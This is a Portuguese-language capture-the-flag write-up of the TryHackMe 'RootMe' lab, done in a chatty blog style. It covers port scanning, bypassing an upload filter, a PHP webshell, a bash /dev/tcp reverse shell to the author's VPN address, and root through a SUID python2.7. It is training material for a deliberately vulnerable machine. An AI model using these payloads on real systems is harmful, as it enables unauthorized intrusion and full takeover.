# RootMe — TryHackMe

Domingo, 21h e pouco. Pizza fria do lado, ventilador fazendo barulho de helicóptero e eu pensando "vou só olhar essa máquina rapidinho". Três horas depois eu tava falando sozinho pro monitor. É isso que dá mexer com CTF de domingo.

## 0. A VPN que sempre me trola

Toda vez é o mesmo ritual: eu juro que a VPN tá conectada, ela jura que não. Dessa vez fui conferir de verdade:

```bash
ip a show tun0
```

![checando o tun0](tun0-demo.gif)

Apareceu `192.168.129.84`. Beleza, tô dentro da rede da THM. Anotei num papelzinho do lado do teclado porque eu SEMPRE esqueço esse número na hora do reverse shell e depois fico caçando.

Subi a máquina no site, peguei o IP do alvo: `10.67.188.203`. Primeiro teste de vida:

```bash
ping 10.67.188.203
```

Respondeu. E o `ttl=62` já me deu um spoilerzinho: é Linux. Nem sabia ainda o quanto esse detalhe ia ser útil.

```bash
TARGET=10.67.188.203
```

Exportei numa variável porque eu tenho preguiça de digitar IP toda hora. Preguiça é a mãe da automação, dizem.

## 1. Nmap: o que esse trem tá rodando?

Não fazia ideia do que esperar. Podia ser SMB, FTP, web, qualquer coisa. Fui do básico:

```bash
nmap -p- -T4 $TARGET
```

Demorou um café. Quando voltou, só duas portas. Confesso que fiquei meio decepcionado, esperava uma festa e veio um chá de cadeira:

```bash
nmap -p 22,80 -sV -sC $TARGET
```

- `22` — SSH, OpenSSH 8.2p1. Anotei e ignorei, porque quebrar SSH na força bruta num domingo à noite não é plano, é castigo.
- `80` — HTTP, Apache 2.4.41. Aí sim, cheirinho de web.

Abri no navegador: página preta, "HackIT - Home", "Can you root me?". Provocação gratuita. Página estática, sem botão, sem login, sem nada. Pensei "tá, e agora?". Quando a página não dá nada, o que não aparece é que interessa.

## 2. Gobuster: caçando porta dos fundos

Se não tem link, tem diretório escondido. Sempre tem. Mandei o gobuster:

```bash
gobuster dir -u http://$TARGET -w /usr/share/wordlists/dirb/common.txt
```

Errei o caminho da wordlist de primeira, claro. Toda máquina que eu uso guarda num lugar diferente e eu nunca lembro. Na segunda tentativa foi.

Ele cuspiu:
- `/panel`
- `/uploads`
- `/css`, `/js`

`/panel` e `/uploads` juntos? Upload + pasta pra ver o que subiu? Meu olho até brilhou. Mas calma, podia ser nada também. Fui olhar.

O `/panel/` era um formzinho humilde: "Select a file to upload". O `/uploads/` tava vazio mas com listagem aberta — dava pra ver cada arquivo que subia. Pensei: "isso aqui tá pedindo pra ser abusado". Mas ainda não sabia como.

## 3. Subindo arquivo igual trouxa

Primeiro fiz o teste mais inocente do mundo: subi uma imagem aleatória que eu tinha no PC. Aceitou na hora. Tá, então o upload funciona. E agora?

Tentei o teste clássico dos CTF:

```bash
echo '<?php echo "pwned"; ?>' > test.php
```

Subi o `test.php` e a página me respondeu com um tapa:

> PHP não é permitido!

Ah, tem filtro. Beleza, pelo menos agora eu sei que o servidor pensa em PHP. Se ele se dá ao trabalho de bloquear, é porque executa. Fiquei até animado — filtro ruim é quase um convite.

Aqui começou minha saga. Eu tinha um `php-reverse-shell.php4` baixado de sei lá onde e fiquei insistindo nele feito um teimoso. Subia, acessava, nada. Subia de novo, nada. Cheguei a achar que o listener tava errado, que era firewall, que era a VPN. Era bem mais besta que isso, mas eu só fui descobrir depois.

Resolvi voltar pro bê-a-bá: subir um negocinho de cada extensão e ver o que acontecia. Fiz `test.php5`, `test.phtml`, `test.php4`, `test.phar`, cada um com o mesmo `echo pwned` dentro. Todos deram "sucesso" no upload. Ué? Então liberou geral?

Não. A diferença apareceu na hora de ACESSAR:

```bash
curl http://$TARGET/uploads/test.php5
curl http://$TARGET/uploads/test.phtml
curl http://$TARGET/uploads/test.php4
```

Os dois primeiros voltaram só a palavra `pwned`. O terceiro voltou o código inteiro. Traduzindo: `.php5` e `.phtml` o servidor EXECUTOU. O `.php4` ele só mostrou como texto, igual mostrar foto de bolo em vez de dar o bolo.

Foi aí que a lâmpada acendeu e eu quis me bater: o shell que eu tava insistindo era justo `.php4`. Vinte minutos jogados no lixo por causa de um número no final do arquivo. Domingo à noite faz isso com a gente.

## 4. "www-data" nunca foi tão bonito

Joguei o `.php4` fora e fiz o menor shell possível, só pra ver se eu tava sonhando:

```bash
echo '<?php system($_GET["cmd"]); ?>' > shell.php5
```

Subi pelo form e rezei:

```bash
curl "http://$TARGET/uploads/shell.php5?cmd=id"
```

Quando voltou `uid=33(www-data)` eu comemorei alto e assustei o cachorro. TAVA DENTRO. Um `system()` de uma linha e a máquina me deu shell. Essas easy são humildes assim mesmo.

Daí virou festa. Tudo que eu queria saber era só trocar o final da URL:

```bash
curl "http://$TARGET/uploads/shell.php5?cmd=whoami"
curl "http://$TARGET/uploads/shell.php5?cmd=pwd;ls -la"
```

`whoami`, `pwd`, `ls`... parecia que eu tinha acabado de ganhar um brinquedo novo.

## 5. Cadê a flag? (spoiler: não tava onde eu achei)

Com shell na mão, fui caçar a flag de usuário. Jurei que ia estar na `/home` de alguém, sei lá, `/home/test`, essas coisas. Procurei igual maluco e nada.

Aí lembrei do comando preguiçoso que resolve tudo:

```bash
curl "http://$TARGET/uploads/shell.php5?cmd=find / -iname user.txt 2>/dev/null"
```

Ele cuspiu um caminho que eu não esperava nem um pouco: `/var/www/user.txt`. No meio dos arquivos do site?? Quem guarda flag ali, gente? Kkk.

```bash
curl "http://$TARGET/uploads/shell.php5?cmd=cat /var/www/user.txt"
```

Primeira flag na conta. Não vou colar aqui pra não estragar a graça de quem for fazer — mas o nome dela já é uma piadinha com o fato de você ter conseguido shell. Quando você ler vai entender.

> ⚠️ Flags ocultas de propósito! Rode os comandos e pegue as suas — colar flag em writeup público estraga a diversão (e a THM não gosta).

## 6. Virando root: o que esse python tá fazendo aqui?

Beleza, sou `www-data`. E agora? Quero ser root, óbvio. Mas como?

O truque que sempre tento primeiro: procurar programa com permissão esquisita. Explicando rapidinho pra quem nunca viu: existe um bit chamado SUID que faz o programa rodar como o DONO do arquivo, não como você. Se o dono é root, você executa e ganha poder de root naquele instante. O `passwd` tem isso de fábrica (precisa mexer no `/etc/shadow`), então ver `passwd` na lista é normal. O que não é normal é ver coisa aleatória.

```bash
curl "http://$TARGET/uploads/shell.php5?cmd=find / -perm -u=s -type f 2>/dev/null | grep -v snap"
```

Veio um listão: `sudo`, `su`, `mount`, `chsh`... tudo cara de sistema. E no meio, um penetra:

```
/usr/bin/python2.7
```

Python?? Com SUID?? Desde quando interpretador precisa disso? NUNCA. Na hora eu pensei "achei". Confirmei o crime:

```bash
curl "http://$TARGET/uploads/shell.php5?cmd=ls -l /usr/bin/python*"
```

```
-rwsr-xr-x 1 root root /usr/bin/python2.7
```

Viu o `s` ali no `rws`? É ele. SUID ligado, dono root. E Python executa qualquer código que você mandar via `import os`. É tipo achar a chave da casa debaixo do tapete.

O payload (documentado no GTFOBins, site que virou minha bíblia):

```bash
/usr/bin/python2.7 -c 'import os; os.execl("/bin/sh", "sh", "-p")'
```

O `-p` é o segredo: ele fala pro shell "preserva o poder que você herdou". Sem o `-p`, o shell abre mão do root por segurança e você volta a ser pobre.

Como eu tava pelo webshell, mandei tudo de uma vez:

```bash
curl "http://$TARGET/uploads/shell.php5?cmd=/usr/bin/python2.7 -c 'import os; os.execl(\"/bin/sh\",\"sh\",\"-p\",\"-c\",\"id;cat /root/root.txt\")'"
```

Voltou `euid=0(root)`. E-UID ZERO. ROOT. Quase derrubei a pizza fria. E junto veio a flag final — que também vou esconder aqui pelo mesmo motivo. Roda o `cat /root/root.txt` aí na tua sessão e pega a tua, a sensação é bem melhor.

## 7. Pra quem quer o reverse de verdade (opcional)

O webshell já deu as duas flags, mas eu fiquei com gostinho de "quero um terminal de verdade". Aí fiz o reverse. Criei o arquivo com meu IP do `tun0`:

```php
<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/192.168.129.84/4444 0>&1'"); ?>
```

Se a tua VPN reconectar e o IP mudar, atualiza essa linha. Pega o atual com `ip a show tun0`.

Um terminal deixando ouvido:

```bash
nc -lvnp 4444
```

Outro terminal subindo e chamando:

```bash
curl -F "fileUpload=@rev.php5" -F "submit=Upload" http://$TARGET/panel/
curl http://$TARGET/uploads/rev.php5
```

Caiu no primeiro terminal. Só que shell reverso cru é sofrimento (sem setinha, sem Ctrl+C), então:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

Aí o privesc é o mesmo de antes, agora digitado na mão:

```bash
/usr/bin/python2.7 -c 'import os; os.execl("/bin/sh","sh","-p")'
whoami
cat /root/root.txt
```

Quando o `whoami` responde `root`, não tem sensação melhor num domingo.

## Resumão pra consulta rápida

| O quê | Onde / como |
|-------|-------------|
| Alvo | `10.67.188.203` |
| Meu tun0 | `192.168.129.84` |
| Portas | 22 SSH, 80 Apache 2.4.41 |
| Diretório da festa | `/panel/` (upload) + `/uploads/` |
| Bypass | `.php` bloqueado, `.php5` e `.phtml` executam |
| user.txt | `find / -iname user.txt` → tava em `/var/www/` (flag oculta 🔒) |
| Privesc | SUID em `/usr/bin/python2.7` + `os.execl(..., "-p")` |
| root.txt | `/root/root.txt` (flag oculta 🔒) |

Vetor completo: upload mal validado + python com SUID. Clássico das easy e nem por isso menos gostoso.

## Moral do domingo

RootMe é simples, mas é o ciclo inteiro do pentest web numa caixinha: enumera, acha o upload, engana o filtro, ganha shell, procura o que tá com permissão errada, vira root.

Meus tropeços oficiais da noite, pra rir (ou chorar):
1. Insistir 20 minutos num `.php4` que nem executava. Valida com `echo pwned` primeiro, sempre.
2. Confiar em shell baixado sem abrir. O meu veio quebrado e eu nem olhei.
3. Achar que flag fica na home. Ela tava no `/var/www/`, me quebrou.
4. Esquecer o IP do `tun0` toda vez. Anota, sério.

"Toda escalação começa com uma pergunta simples: o que aqui não deveria ter essa permissão?" — dessa vez era o python, e ele entregou o root de bandeja.

Que venha a próxima. Prometo não travar no upload de novo. (Mentira.)
